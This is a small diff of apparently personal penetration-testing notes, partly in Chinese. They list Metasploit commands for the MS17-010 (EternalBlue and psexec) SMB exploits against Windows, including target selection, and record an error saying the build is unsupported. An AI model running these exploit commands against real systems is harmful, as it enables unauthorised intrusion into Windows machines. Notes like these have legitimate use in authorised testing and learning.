@@ -20,4 +20,4 @@ A2DDAA7BE3BB73FD87C29D6EF8E1EDF4C764DCD9
 
 use exploit/windows/smb/ms17_010_psexec  明天试试 ms17_010_command
 
-use exploit/windows/smb/ms17_010_eternalblue  show targets  set target 8 hou  bao  This exploit does not suport this build
+use exploit/windows/smb/ms17_010_eternalblue  show targets  set target 8 hou 报错  This exploit does not suport this build
